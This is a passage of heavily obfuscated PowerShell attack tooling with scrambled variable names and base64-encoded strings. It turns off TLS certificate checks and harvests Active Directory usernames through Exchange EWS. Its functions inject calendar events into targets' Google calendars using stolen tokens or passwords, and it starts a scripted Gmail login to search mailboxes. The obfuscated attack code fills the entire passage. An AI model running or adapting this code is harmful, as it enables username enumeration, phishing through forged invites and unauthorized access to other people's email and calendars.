AgACAAIAB9AA=='))) 
  ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
  ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
  ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
  [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
  if ($ExchHostname -ne "")
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIABFAFcAUwAgAFUAUgBMACAA'))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA'))))
    ${/==\/\_______/\/=}.Url = new-object System.Uri(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA')))))
  }
  else
  {
    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABvAGQAaQBzAGMAbwB2AGUAcgBpAG4AZwAgAGUAbQBhAGkAbAAgAHMAZQByAHYAZQByACAAZgBvAHIAIAA='))) + $EmailAddress + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))))
    ${/==\/\_______/\/=}.AutoDiscoverUrl($EmailAddress, {$true})
  }    
    ${__/\_/\/=\_/\/==\} = 0
    ${/=\/====\_/\/=\/\} = ${___/\/\_/\/=\/=\/}.count
    echo "`n`r"
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABHAGUAdAB0AGkAbgBnACAAQQBEACAAdQBzAGUAcgBuAGEAbQBlAHMAIABmAG8AcgAgAGUAYQBjAGgAIABlAG0AYQBpAGwAIABhAGQAZAByAGUAcwBzAC4ALgAuAA==')))
    echo "`n`r"
    ${_/=\_____/====\_/} = @()
    foreach($EmailAddress in ${___/\/\_/\/=\/=\/})
    { 
        ${/=\_______/=\___/}= new-object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Contacts,$EmailAddress)   
	    $Error.Clear();
	    ${_/==\_/\/\/\___/=}= new-object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties) 
	    ${_/\_/==\/\_____/\} = ${/==\/\_______/\/=}.ResolveName($EmailAddress,$ParentFolderIds,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryOnly,$true,${_/==\_/\/\/\___/=});
	    if($Error.Count -eq 0)
        {
		    foreach(${_/=\/\/\_/====\/\} in ${_/\_/==\/\_____/\})
            {	
                if((${_/=\/\/\_/====\/\}.Mailbox.Address.ToLower() -eq $EmailAddress.ToLower()) -bor $Partial.IsPresent -bor $AliasOnly.IsPresent )
                {
                    ${_/\_/==\/=\/==\/\} = ${_/\_/==\/\_____/\}.Contact.Alias
				    echo (($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIAAkAEUAbQBhAGkAbABBAGQAZAByAGUAcwBzACAAPQAgAA==')))) + ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMQA1AH0AIAA=')))))  
                    ${_/=\_____/====\_/} += ${_/\_/==\/=\/==\/\}
                }
		        elseif((${_/=\/\/\_/====\/\}.Mailbox.Address.ToLower() -eq $EmailAddress.ToLower()) -bor $Partial.IsPresent)
                {
				    echo ${_/\_/==\/\_____/\}.Contact
			    }
			    else
                {
				    Write-host -ForegroundColor Yellow ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAdABpAGEAbAAgAE0AYQB0AGMAaAAgAGYAbwB1AG4AZAAgAGIAdQB0ACAAbgBvAHQAIAByAGUAdAB1AHIAbgBlAGQAIABiAGUAYwBhAHUAcwBlACAAUAByAGkAbQBhAHIAeQAgAEUAbQBhAGkAbAAgAEEAZABkAHIAZQBzAHMAIABkAG8AZQBzAG4AJwB0ACAAbQBhAHQAYwBoACAAYwBvAG4AcwBpAGQAZQByACAAdQBzAGkAbgBnACAALQBQAGEAcgB0AGkAYQBsACAA'))) + ${_/\_/==\/\_____/\}.Contact.DisplayName + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAA6ACAAUwB1AGIAagBlAGMAdAAtAA=='))) + ${_/\_/==\/\_____/\}.Contact.Subject + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAA6ACAARQBtAGEAaQBsAC0A'))) + ${_/=\/\/\_/====\/\}.Mailbox.Address)
			    }
		    }
        }
        ${__/\_/\/=\_/\/==\} += 1	
        Write-Host -NoNewline $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMQAyAH0AIABvAGYAIAAkAHsAMwA2AH0AIAB1AHMAZQByAHMAIAB0AGUAcwB0AGUAZAAgAA0A')))	
	}
   if ($OutFile -ne "")
   {
   ${_/=\_____/====\_/} | Out-File -Encoding ascii $OutFile
   }
}
Function Invoke-InjectGEventAPI{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $PrimaryEmail = "",       
        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $AccessToken = "",        
        [Parameter(Position = 2, Mandatory = $false)]
        [string]
        $EventTitle = "",
        [Parameter(Position = 3, Mandatory = $true)]
        [string]
        $Targets = "", 
        [Parameter(Position = 4, Mandatory = $false)]
        [string]
        $EventLocation = "",
        [Parameter(Position = 5, Mandatory = $false)]
        [string]
        $EventDescription = "",
        [Parameter(Position = 6, Mandatory = $true)]
        [string]
        $StartDateTime = "", 
        [Parameter(Position = 7, Mandatory = $true)]
        [string]
        $EndDateTime = "",   
        [Parameter(Position = 8, Mandatory = $false)]
        [string]
        $TimeZone = "America/New_York",
        [Parameter(Position = 9, Mandatory = $false)]
        [string]
        $allowModify = "false", 
        [Parameter(Position = 10, Mandatory = $false)]
        [string]
        $allowInvitesOther = "true", 
        [Parameter(Position = 11, Mandatory = $false)]
        [string]
        $showInvitees = "false",  
        [Parameter(Position = 12, Mandatory = $false)]
        [string]
        $ResponseStatus = "accepted"  
    )
        ${___/==\/=\_/=====} = $targets -split ","
        foreach(${__/=\__/=\/\/\___} in ${___/==\/=\_/=====})
        {
            ${___/====\/\______} = @{
                kind = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBhAGwAZQBuAGQAYQByACMAZQB2AGUAbgB0AA==')));
                start = @{ dateTime = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABTAHQAYQByAHQARABhAHQAZQBUAGkAbQBlAA=='))); timeZone = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAGkAbQBlAFoAbwBuAGUA')))};
                end = @{ dateTime = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABFAG4AZABEAGEAdABlAFQAaQBtAGUA'))); timeZone = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABUAGkAbQBlAFoAbwBuAGUA')))};
                summary = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABFAHYAZQBuAHQAVABpAHQAbABlAA==')));
                description = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABFAHYAZQBuAHQARABlAHMAYwByAGkAcAB0AGkAbwBuAA==')));
                location = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABFAHYAZQBuAHQATABvAGMAYQB0AGkAbwBuAA==')));
                attendees = @(
                    @{email= $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAA5AH0A'))); responseStatus = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABSAGUAcwBwAG8AbgBzAGUAUwB0AGEAdAB1AHMA')))}
                    );
                guestsCanInviteOthers = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABhAGwAbABvAHcASQBuAHYAaQB0AGUAcwBPAHQAaABlAHIA')));
                guestsCanSeeOtherGuests = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABzAGgAbwB3AEkAbgB2AGkAdABlAGUAcwA=')));
                guestsCanModify = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABhAGwAbABvAHcATQBvAGQAaQBmAHkA')))
            }
            ${/==\/==\_/\/\/\__} = @{'Accept'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAvACoA')));'Content-Type'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAbABpAGMAYQB0AGkAbwBuAC8AagBzAG8AbgA=')));'Authorization'= $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBlAGEAcgBlAHIAIAAkAEEAYwBjAGUAcwBzAFQAbwBrAGUAbgA=')))}
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGkAbgBqAGUAYwB0AGkAbgBnACAAZQB2AGUAbgB0ACAAaQBuAHQAbwAgAHQAYQByAGcAZQB0ACAAYwBhAGwAZQBuAGQAYQByACgAcwApADoAIAAkAHsAMQAwADkAfQA=')))
            ${/===\_____/====\_} = irm -Uri $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHcAdwB3AC4AZwBvAG8AZwBsAGUAYQBwAGkAcwAuAGMAbwBtAC8AYwBhAGwAZQBuAGQAYQByAC8AdgAzAC8AYwBhAGwAZQBuAGQAYQByAHMALwAkAFAAcgBpAG0AYQByAHkARQBtAGEAaQBsAC8AZQB2AGUAbgB0AHMA'))) -Method POST -Headers ${/==\/==\_/\/\/\__} -Body (ConvertTo-Json ${___/====\/\______})
        }
}
Function Invoke-InjectGEvent{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $EmailAddress = "",
        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $Password = "",
        [Parameter(Position = 2, Mandatory = $false)]
        [string]
        $EventTitle = "",
        [Parameter(Position = 3, Mandatory = $true)]
        [string]
        $Targets = "",
        [Parameter(Position = 4, Mandatory = $false)]
        [string]
        $EventLocation = "",
        [Parameter(Position = 5, Mandatory = $false)]
        [string]
        $EventDescription = "",
        [Parameter(Position = 6, Mandatory = $true)]
        [string]
        $StartDateTime = "", 
        [Parameter(Position = 7, Mandatory = $true)]
        [string]
        $EndDateTime = "",   
        [Parameter(Position = 8, Mandatory = $false)]
        [string]
        $TimeZone = "America/New_York",
        [Parameter(Position = 9, Mandatory = $false)]
        [string]
        $allowModify = "false", 
        [Parameter(Position = 10, Mandatory = $false)]
        [string]
        $allowInvitesOther = "true", 
        [Parameter(Position = 11, Mandatory = $false)]
        [string]
        $showInvitees = "false",  
        [Parameter(Position = 12, Mandatory = $false)]
        [string]
        $userStatus = "false",  
        [Parameter(Position = 13, Mandatory = $false)]
        [string]
        $createdBySet = "false"  
    )
        ${/====\/\__/=\_/\/} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGEAYwBjAG8AdQBuAHQAcwAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGkAZwBuAGkAbgA='))) -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        ${_/======\/==\/===} = ${/====\/\__/=\_/\/}.Forms[0]
        ${_/======\/==\/===}.Fields[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGEAaQBsAA==')))]= $EmailAddress
        ${______/\_/\/\/\/\} = iwr -Uri ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGEAYwBjAG8AdQBuAHQAcwAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGkAZwBuAGkAbgAvAHYAMQAvAGwAbwBvAGsAdQBwAA==')))) -WebSession $googlesession -Method POST -Body ${_/======\/==\/===}.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        ${__/=\/\/=\_/=\_/\} = ${______/\_/\/\/\/\}.Forms[0]
        ${__/=\/\/=\_/=\_/\}.Fields[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGEAaQBsAA==')))]= $EmailAddress
        ${__/=\/\/=\_/=\_/\}.Fields[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AGQA')))]= $Password
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGwAbwBnAGcAaQBuAGcAIABpAG4AdABvACAAYQBjAGMAbwB1AG4AdAAgAHcAaQB0AGgAIABwAHIAbwB2AGkAZABlAGQAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMA')))
        ${_/\/=\/\__/\/===\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGEAYwBjAG8AdQBuAHQAcwAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGkAZwBuAGkAbgAvAGMAaABhAGwAbABlAG4AZwBlAC8AcwBsAC8AcABhAHMAcwB3AG8AcgBkAA==')))
        ${/=\/\___/\_____/\} = iwr -Uri ${_/\/=\/\__/\/===\} -WebSession $googlesession -Method POST -Body ${__/=\/\/=\_/=\_/\}.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        ${____/\__/\/==\/\/} = $googlesession.Cookies.GetCookies(${_/\/=\/\__/\/===\})
        foreach (${/\____/===\/=\___} in ${____/\__/\/==\/\/})
        {
            if ((${/\____/===\/=\___}.name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA')))) -and (${/\____/===\/=\___}.value -ne ""))
            {
                ${__/==\/\_/\____/\} = $true
            }
        }
        if (${__/==\/\_/\____/\})
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIABhAHAAcABlAGEAcgBzACAAdABvACAAYgBlACAAcwB1AGMAYwBlAHMAcwBmAHUAbAA=')))
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABoAGUAbgB0AGkAYwBhAHQAaQBvAG4AIABhAHAAcABlAGEAcgBzACAAdABvACAAaABhAHYAZQAgAGYAYQBpAGwAZQBkAC4AIABDAGgAZQBjAGsAIAB0AGgAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAuAA==')))       
            break
        }
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABPAGIAdABhAGkAbgBpAG4AZwAgACcAcwBlAGMAaQBkACcAIABmAG8AcgAgAFAATwBTAFQAaQBuAGcAIAB0AG8AIABjAGEAbABlAG4AZABhAHIA')))
        ${/==\/========\_/\} = iwr -Uri ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGMAYQBsAGUAbgBkAGEAcgAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBjAGEAbABlAG4AZABhAHIALwByAGUAbgBkAGUAcgA=')))) -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHgAdAAvAGgAdABtAGwALAAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAHgAaAB0AG0AbAArAHgAbQBsACwAIABpAG0AYQBnAGUALwBqAHgAcgAsACAAKgAvACoA')))}
        ${/==\/========\_/\}.tostring() -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/ADwAPQB3AGkAbgBkAG8AdwBcAFsAJwBJAE4ASQBUAEkAQQBMAF8ARABBAFQAQQAnAFwAXQBcACAAPQBcACAAKQAoAD8AcwApAC4AKgAoAD8APQBcAG4AOwApAA=='))) | out-null
        ${_/\__/=\/=\___/==} = ConvertFrom-Json $Matches[0]
        ${_______/==\/==\_/} = ${_/\__/=\/=\___/==}[26]
        ${/==\____/==\/=\/=} = ($StartDateTime + "/" + $EndDateTime)
        ${/==\/==\_/\/\/\__} = @{'Accept'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAvACoA')));'X-If-No-Redirect'='1';'X-Is-Xhr-Request'='1';'Content-Type'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAbABpAGMAYQB0AGkAbwBuAC8AeAAtAHcAdwB3AC0AZgBvAHIAbQAtAHUAcgBsAGUAbgBjAG8AZABlAGQAOwBjAGgAYQByAHMAZQB0AD0AdQB0AGYALQA4AA==')));'Referer'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGMAYQBsAGUAbgBkAGEAcgAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBjAGEAbABlAG4AZABhAHIALwByAGUAbgBkAGUAcgA/AHAAbABpAD0AMQA=')));'Accept-Language'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBuAC0AVQBTAA==')));'Accept-Encoding'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwB6AGkAcAA7ACAAZABlAGYAbABhAHQAZQA=')));'User-Agent'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAAMQAwAC4AMAA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA9ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8A')));'Host'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBhAGwAZQBuAGQAYQByAC4AZwBvAG8AZwBsAGUALgBjAG8AbQA=')));'Cache-Control'=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBvAC0AYwBhAGMAaABlAA==')))}
        ${_/===\/=\_/=\/=\_} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHgAdAA9ACQARQB2AGUAbgB0AFQAaQB0AGwAZQAmAG8AdQB0AHAAdQB0AD0AagBzACYAdQBzAGUAcAByAG8AdABvAD0AdAByAHUAZQAmAGgAbAA9AGUAbgAmAGQAYQB0AGUAcwA9ACQAewAxADAANQB9ACYAbABvAGMAYQB0AGkAbwBuAD0AJABFAHYAZQBuAHQATABvAGMAYQB0AGkAbwBuACYAcABwAHIAbwBwAD0AZQB2AGUAbgB0AEMAbwBsAG8AcgAlADMAQQBuAG8AbgBlACYAYQBkAGQAPQAkAFQAYQByAGcAZQB0AHMAJgBzAHQAYQB0AHUAcwA9ADEAJgBjAHIAbQA9AEIAVQBTAFkAJgBpAGMAYwA9AEQARQBGAEEAVQBMAFQAJgBzAGMAcAA9AE8ATgBFACYAYQBjAHQAaQBvAG4APQBDAFIARQBBAFQARQAmAGQAZQB0AGEAaQBsAHMAPQAkAEUAdgBlAG4AdABEAGUAcwBjAHIAaQBwAHQAaQBvAG4AJgBzAHAAcgBvAHAAPQBnAG8AbwAuAGEAbABsAG8AdwBNAG8AZABpAGYAeQAlADMAQQAkAGEAbABsAG8AdwBNAG8AZABpAGYAeQAmAHMAcAByAG8AcAA9AGcAbwBvAC4AYQBsAGwAbwB3AEkAbgB2AGkAdABlAHMATwB0AGgAZQByADoAJABBAGwAbABvAHcASQBuAHYAaQB0AGUAcwBPAHQAaABlAHIAJgBzAHAAcgBvAHAAPQBnAG8AbwAuAHMAaABvAHcASQBuAHYAaQB0AGUAZQBzADoAJABTAGgAbwB3AEkAbgB2AGkAdABlAGUAcwAmAHMAcAByAG8AcAA9AGcAbwBvAC4AdQBzAGUAcgBTAHQAYQB0AHUAcwA6ACQAdQBzAGUAcgBTAHQAYQB0AHUAcwAmAHMAcAByAG8AcAA9AGcAbwBvAC4AYwByAGUAYQB0AGUAZABCAHkAUwBlAHQAOgAkAGMAcgBlAGEAdABlAGQAQgB5AFMAZQB0ACYAcwB0AHoAPQAkAFQAaQBtAGUAWgBvAG4AZQAmAHMAZQBjAGkAZAA9ACQAewAxADAAMgB9ACYAcwBmAD0AdAByAHUAZQAmAHMAcgBjAD0AJgB1AG4AYgBvAHUAbgBkAGUAZAA9AGYAYQBsAHMAZQA=')))
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGkAbgBqAGUAYwB0AGkAbgBnACAAZQB2AGUAbgB0ACAAaQBuAHQAbwAgAHQAYQByAGcAZQB0ACAAYwBhAGwAZQBuAGQAYQByACgAcwApADoAIAAkAFQAYQByAGcAZQB0AHMA')))
        ${/===\_____/====\_} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGMAYQBsAGUAbgBkAGEAcgAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBjAGEAbABlAG4AZABhAHIALwBlAHYAZQBuAHQA'))) -WebSession $googlesession -Method POST -Headers ${/==\/==\_/\/\/\__} -Body ${_/===\/=\_/=\/=\_}
        ${/=\_/=\__/=\_/==\} = ${/===\_____/====\_}.RawContent -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACIA')))
        ${____/======\_/\_/} = ${/=\_/=\__/=\_/==\}[1]
        ${_/\/\_/=\__/\/==\} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGMAYQBsAGUAbgBkAGEAcgAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBjAGEAbABlAG4AZABhAHIALwBlAHYAZQBuAHQA'))) -WebSession $googlesession -Method POST -Headers ${/==\/==\_/\/\/\__} -Body $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBpAGQAPQAkAHsAMQAwADAAfQAmAHMAZgA9AHQAcgB1AGUAJgBzAGUAYwBpAGQAPQAkAHsAMQAwADIAfQA=')))
        [xml]${__/\/==\___/=\/\/} = ${_/\/\_/=\__/\/==\}.Content
        if(${__/\/==\___/=\/\/}.eventpage.eid.value -ne ${____/======\_/\_/})
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBMAG8AbwBrAHMAIABsAGkAawBlACAAcwBvAG0AZQB0AGgAaQBuAGcAIABtAGEAeQAgAGgAYQB2AGUAIABnAG8AbgBlACAAdwByAG8AbgBnAC4AIABNAGEAeQBiAGUAIABsAG8AZwBpAG4AIAB0AG8AIABHAC0AQwBhAGwAZQBuAGQAYQByACAAZABpAHIAZQBjAHQAbAB5ACAAYQBuAGQAIABjAGgAZQBjAGsAIAB0AG8AIABzAGUAZQAgAGkAZgAgAHQAaABlACAAZQB2AGUAbgB0ACAAdwBhAHMAIABjAHIAZQBhAHQAZQBkAC4A')))
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbACoAXQAgAFMAdQBjAGMAZQBzAHMAIQAgAFQAaABlACAAZABlAHQAYQBpAGwAcwAgAGYAbwByACAAdABoAGUAIABlAHYAZQBuAHQAIABhAHIAZQAgAGIAZQBsAG8AdwAKAA==')))
            ${/===\____/\____/=} = ${__/\/==\___/=\/\/}.eventpage.eid.value
            ${_____/=\_/\__/\_/} = ${__/\/==\___/=\/\/}.eventpage.summary.value
            ${_/\/=\____/=\__/=} = ${__/\/==\___/=\/\/}.eventpage.location.value
            ${/\_______/\/\__/=} = ${__/\/==\___/=\/\/}.eventpage.description.value
            ${/=\/=\_/\/=====\_} = ${__/\/==\___/=\/\/}.eventpage.dates.display
            ${/==\_/\/\_/\_/\/=} = ${__/\/==\___/=\/\/}.eventpage.timezone.value
            ${__/\__/\____/\_/\} = ${__/\/==\___/=\/\/}.eventpage.attendees.attendee.principal.display
            ${/=\/\______/===\_} = ${__/\/==\___/=\/\/}.eventpage.creator.principal.value
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABUAGkAdABsAGUAIAA6ACAAJAB7ADkAOAB9AA==')))
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABMAG8AYwBhAHQAaQBvAG4AIAA6ACAAJAB7ADkANwB9AA==')))
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAA6ACAAJAB7ADkANgB9AA==')))
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABEAGEAdABlAHMAIAA6ACAAJAB7ADkANQB9AA==')))
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABUAGkAbQBlAHoAbwBuAGUAIAA6ACAAJAB7ADkANAB9AA==')))
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAHQAdABlAG4AZABlAGUAcwAgADoAIAAkAHsAOQAzAH0A')))
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAHIAZQBhAHQAbwByACAAOgAgACQAewA5ADIAfQA=')))
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABFAHYAZQBuAHQASQBEACAAOgAgACQAewA5ADEAfQA=')))
        }
}
Function Invoke-SearchGmail{
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $EmailAddress = "",
        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $Password = "",
        [Parameter(Position = 2, Mandatory = $true)]
        [string]
        $Search = "",
        [Parameter(Position = 3, Mandatory = $true)]
        [string]
        $OutputCsv = ""
    )
        ${/====\/\__/=\_/\/} = iwr -Uri $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGEAYwBjAG8AdQBuAHQAcwAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGkAZwBuAGkAbgA='))) -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        ${_/======\/==\/===} = ${/====\/\__/=\_/\/}.Forms[0]
        ${_/======\/==\/===}.Fields[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGEAaQBsAA==')))]= $EmailAddress
        ${______/\_/\/\/\/\} = iwr -Uri ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAGEAYwBjAG8AdQBuAHQAcwAuAGcAbwBvAGcAbABlAC4AYwBvAG0ALwBzAGkAZwBuAGkAbgAvAHYAMQAvAGwAbwBvAGsAdQBwAA==')))) -WebSession $googlesession -Method POST -Body ${_/======\/==\/===}.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        ${__/=\/\/=\_/=\_/\} = ${______/\_/\/\/\/\}.Forms[0]
        ${__/=\/\/=\_/=\_/\}.Fields[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBtAGEAaQBsAA==')))]= $EmailAddress
        ${__/=\/\/=\_/=\_/\}.Fields[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AGQA')))]= $Password
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGwAbwBnAGcAaQBuAGcAIABpAG4AdABvACAAYQBjAGMAbwB1AG4AdAAgAHcAaQB0AGgAIABwAHIAbwB2AGkAZABlAGQAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMA')))
